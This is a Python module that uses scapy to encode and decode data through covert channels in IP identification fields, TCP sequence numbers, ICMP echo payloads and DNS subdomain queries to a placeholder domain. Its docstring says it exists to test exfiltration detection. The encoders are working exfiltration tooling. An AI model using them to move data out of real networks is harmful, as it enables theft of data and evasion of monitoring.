"""Covert storage channels — hide data in packet fields.

Each channel encodes bytes into a sequence of carrier packets and decodes them
back, for testing exfiltration detection. A 2-byte length header prefixes the
payload so decode recovers the exact bytes. For authorized testing only.

Channels: IP identification field, TCP initial sequence number, ICMP echo
payload, and DNS subdomain (base32 tunnel).
"""

from __future__ import annotations

import base64
import struct


def _framed(data: bytes) -> bytes:
    return struct.pack("!H", len(data)) + data


def _first(field):
    if field is None:
        return None
    try:
        return field[0] if len(field) else None
    except TypeError:
        return field


class IpIdChannel:
    """2 bytes per packet in the IP identification field."""

    def encode(self, data: bytes, dst: str = "10.0.0.1") -> list:
        from scapy.layers.inet import ICMP, IP

        payload = _framed(data)
        pkts = []
        for i in range(0, len(payload), 2):
            chunk = payload[i:i + 2].ljust(2, b"\x00")
            pkts.append(IP(dst=dst, id=struct.unpack("!H", chunk)[0]) / ICMP())
        return pkts

    def decode(self, pkts) -> bytes:
        from scapy.layers.inet import IP

        raw = b"".join(struct.pack("!H", int(p[IP].id)) for p in pkts)
        n = struct.unpack("!H", raw[:2])[0]
        return raw[2:2 + n]


class TcpIsnChannel:
    """4 bytes per packet in the TCP sequence number (SYN carriers)."""

    def encode(self, data: bytes, dst: str = "10.0.0.1", dport: int = 80) -> list:
        from scapy.layers.inet import IP, TCP

        payload = _framed(data)
        pkts = []
        for i in range(0, len(payload), 4):
            chunk = payload[i:i + 4].ljust(4, b"\x00")
            pkts.append(IP(dst=dst) / TCP(dport=dport, flags="S",
                                          seq=struct.unpack("!I", chunk)[0]))
        return pkts

    def decode(self, pkts) -> bytes:
        from scapy.layers.inet import TCP

        raw = b"".join(struct.pack("!I", int(p[TCP].seq)) for p in pkts)
        n = struct.unpack("!H", raw[:2])[0]
        return raw[2:2 + n]


class IcmpPayloadChannel:
    """N bytes per packet in the ICMP echo payload."""

    def __init__(self, chunk: int = 32):
        self.chunk = chunk

    def encode(self, data: bytes, dst: str = "10.0.0.1") -> list:
        from scapy.layers.inet import ICMP, IP
        from scapy.packet import Raw

        payload = _framed(data)
        return [IP(dst=dst) / ICMP() / Raw(payload[i:i + self.chunk])
                for i in range(0, len(payload), self.chunk)] or [IP(dst=dst) / ICMP()]

    def decode(self, pkts) -> bytes:
        from scapy.packet import Raw

        raw = b"".join(bytes(p[Raw].load) for p in pkts if p.haslayer(Raw))
        n = struct.unpack("!H", raw[:2])[0]
        return raw[2:2 + n]


class DnsTunnelChannel:
    """base32-encoded data as subdomains of DNS queries."""

    def __init__(self, domain: str = "tunnel.example.com", label_len: int = 30):
        self.domain = domain
        self.label_len = label_len

    def encode(self, data: bytes) -> list:
        from scapy.layers.dns import DNS, DNSQR
        from scapy.layers.inet import IP, UDP

        enc = base64.b32encode(_framed(data)).decode().rstrip("=").lower()
        queries = []
        for i in range(0, len(enc), self.label_len):
            sub = enc[i:i + self.label_len]
            queries.append(IP() / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=f"{sub}.{self.domain}")))
        return queries

    def decode(self, queries) -> bytes:
        from scapy.layers.dns import DNS

        labels = []
        for q in queries:
            qd = _first(q[DNS].qd)
            if qd is None:
                continue
            name = qd.qname.decode("latin-1", "replace") if isinstance(qd.qname, bytes) else str(qd.qname)
            name = name.rstrip(".")
            sub = name[: -len(self.domain) - 1] if name.endswith(self.domain) else name.split(".")[0]
            labels.append(sub)
        enc = "".join(labels).upper()
        enc += "=" * ((8 - len(enc) % 8) % 8)
        raw = base64.b32decode(enc)
        n = struct.unpack("!H", raw[:2])[0]
        return raw[2:2 + n]
